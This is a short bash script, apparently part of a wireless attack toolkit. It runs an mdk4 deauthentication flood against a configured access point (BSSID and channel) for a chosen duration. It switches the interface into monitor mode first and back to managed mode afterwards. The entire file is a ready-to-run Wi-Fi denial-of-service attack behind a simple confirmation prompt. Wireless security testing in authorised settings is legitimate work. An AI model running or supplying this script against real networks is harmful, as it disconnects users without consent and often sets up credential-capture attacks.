#!/bin/bash
# Developer Utility: Manual Deauth Flood using mdk4
# Usage: ./run_mdk4_deauth.sh

# Load config
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../config.sh"

# Cleanup
cleanup() {
    echo ""
    rm -f /tmp/watt_attack_active

    # Mode check
    MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
    if [[ "$MODE" != "managed" ]]; then
        echo "[+] Reverting to Managed mode."
        bash "$SCRIPT_DIR/set-mode-managed.sh"
        echo "[✓] Interface set to Managed mode."
    fi

    exit 0   
}

# Exit traps > cleanup
trap cleanup EXIT
trap cleanup SIGINT

# Validate config vars
if [[ -z "$INTERFACE" || -z "$BSSID" || -z "$CHANNEL" ]]; then
    echo "[!] INTERFACE, BSSID, or CHANNEL not defined in config.sh"
    exit 1
fi

# Display config
echo "[+] Interface   : $INTERFACE"
echo "[+] Target BSSID: $BSSID"
echo "[+] Channel     : $CHANNEL"
echo "[+] Mode        : T007 - Deauthentication Flood"
echo ""

# Confirm attack
read -rp "[?] Proceed with attack? (y/N): " confirm
if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    echo "[!] Cancelled."
    exit 0
fi

# Input duration
read -rp "[?] Duration (seconds) [default]: ${T007_ATTACK_DURATION}]: " DURATION
DURATION="${DURATION:-$T007_ATTACK_DURATION}"

# Launch attack
echo "T007" > /tmp/watt_attack_active
echo ""
echo "[+] Starting Attack."

# Monitor mode check
MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
if [[ "$MODE" != "monitor" ]]; then
    echo "[+] Enabling Monitor mode."
    bash "$SCRIPT_DIR/set-mode-monitor.sh"
    echo "[✓] Interface set to Monitor mode."
    echo ""
fi

echo "[+] Running mdk4 for $DURATION seconds..."
echo

sudo timeout "$DURATION" mdk4 "$INTERFACE" d -B "$BSSID" -c "$CHANNEL"
EXIT_CODE=$?

if [[ "$EXIT_CODE" -eq 124 ]]; then
    echo ""
    echo "[✓] Attack ended."
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    echo "[!] mdk4 exited with code $EXIT_CODE"
fi

exit 0